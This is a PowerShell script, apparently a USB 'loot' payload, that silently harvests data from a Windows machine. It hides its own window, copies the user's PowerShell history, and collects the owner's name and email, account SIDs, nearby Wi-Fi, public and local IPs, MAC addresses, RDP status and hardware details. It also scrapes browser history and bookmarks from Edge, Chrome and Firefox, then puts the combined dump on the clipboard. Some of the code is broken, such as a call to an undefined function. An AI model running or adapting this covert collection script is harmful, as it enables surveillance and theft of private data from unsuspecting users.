$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $i -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
$FileName = "$FolderName.txt"
$ZIP = "$FolderName.zip"
New-Item -Path $env:tmp/$FolderName -ItemType Directory
tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
try {
$fullName = (Get-LocalUser -Name $env:USERNAME).FullName
} catch {
    Write-Error "No name was detected"
    return $env:UserName
    -ErrorAction SilentlyContinue
}
$fullName = Get-fullName 
function Get-email { 
    try { 
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email 
    } catch {
        Write-Error "An email was not found"
        return "No Email Detected" 
        -ErrorAction SilentlyContinue
    }
}
$email = Get-email
$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String
try { 
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
} catch {
    $NearbyWifi = "No nearby wifi networks detected"
}
try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
} catch {
    $computerPubIP = "Error getting Public IP"
}
try {
    $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
} catch {
    $localIP = "Error getting local IP"
} 
$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select Name, MacAddress, Status | Out-String 
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
    $RDP = "RDP is Enabled" 
} else {
    $RDP = "RDP is NOT enabled" 
}
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerName = $computerSystem.Name
$computerModel = $computerSystem.Model
$computerManufacturer = $computerSystem.Manufacturer
$computerBIOS = Get-CimInstance CIM_BIOSElement | Out-String
$computerOs = (Get-WMIObject win32_operatingsystem) | Select Caption, Version | Out-String
$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List | Out-String
$computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List | Out-String
$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
$computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table | Out-String
function Get-BrowserData {
    [CmdletBinding()]
    param (	
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,    
        [Parameter(Position=1, Mandatory=$True)]
        [string]$DataType 
    ) 
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    if ($Browser -eq 'chrome' -and $DataType -eq 'history')  { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'history')  { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') { $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history')  { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
       if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}
$CombinedOutput = @"
Full Name: $fullName
Email: $email
User Accounts:
$luser
Nearby WiFi Networks:
$NearbyWifi
Public IP: $computerPubIP
Local IP:
$localIP
MAC Addresses:
$MAC
RDP Status:
$RDP
Computer Name: $computerName
Computer Model: $computerModel
Computer Manufacturer: $computerManufacturer
BIOS Information:
$computerBIOS
Operating System Information:
$computerOs
CPU Information:
$computerCpu
Mainboard Information:
$computerMainboard
RAM Capacity: $computerRamCapacity
RAM Information:
$computerRam
Browser Data:
"@ + (Get-BrowserData -Browser "edge" -DataType "history" | Out-String) + @"
===============================================
"@
(Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-String) + @"
===============================================
"@
(Get-BrowserData -Browser "chrome" -DataType "history" | Out-String) + @"
===============================================
"@
(Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-String) + @"
===============================================
"@
(Get-BrowserData -Browser "firefox" -DataType "history" | Out-String)
$Output1 = (Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Format-Table -AutoSize | Out-String).Trim()
$CombinedOutput += @"
===============================================
Drivers Information:
$Output1
"@
$CombinedOutput | Set-Clipboard
